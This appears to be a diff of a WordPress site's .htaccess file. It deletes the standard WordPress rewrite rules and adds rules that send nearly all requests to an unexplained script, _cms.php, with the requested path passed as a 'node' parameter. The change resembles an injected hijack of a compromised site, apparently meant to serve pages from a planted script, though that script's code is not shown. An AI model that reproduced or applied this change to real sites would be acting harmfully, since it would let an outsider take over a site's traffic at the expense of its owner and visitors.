@@ -1,12 +1,9 @@
-
-# BEGIN WordPress
 <IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /
-RewriteRule ^index\.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . /index.php [L]
+  RewriteEngine On
 </IfModule>
 
-# END WordPress
+<IfModule mod_rewrite.c>
+RewriteCond $1 !^(_cms\.php|assets|wp-content|wp-import.php)
+RewriteCond %{REQUEST_URI} !\.(pdf|mp4|mp3|jpg|png)$
+RewriteRule ^(.*)$ _cms.php/?%{QUERY_STRING}&node=$1 [L]
+</IfModule>
